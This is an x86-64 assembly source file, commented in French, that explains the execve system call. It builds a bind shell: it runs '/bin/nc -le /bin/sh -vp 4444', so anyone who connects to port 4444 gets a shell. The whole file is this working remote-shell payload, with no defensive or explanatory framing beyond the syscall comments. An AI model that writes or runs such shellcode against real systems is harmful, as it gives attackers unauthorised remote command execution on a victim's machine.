;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;           /bin/nc -le /bin/sh -vp 4444             ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
BITS 64

global _start

section .data
	nc   db "/bin/nc",0
	port db "4444",0
	verb db "-vp",0
	bash db "/bin/sh",0
	list db "-le",0

section .text

	_start:

		; Utilisation de execve :
		; rda --> 59 				(numero de l'appel systeme)
		; rdi --> pointeur_nom_programme_appele (l'adresse qui pointe sur le nom du programme)
		; rsi --> pointeur_vers_tableau_argv    (doit terminer par un pointeur NULL)
		; rdx --> pointeur_vers_tableau_envp    (ici pas besoin de variables d'environnement dont NULL)

		xor rdx,rdx

		mov rax,59
		mov rdi,nc

		push rdx
		push port
		push verb
		push bash
		push list
		push nc

		mov rsi,rsp
		syscall

		mov rax,60
		xor rdi,rdi
		syscall
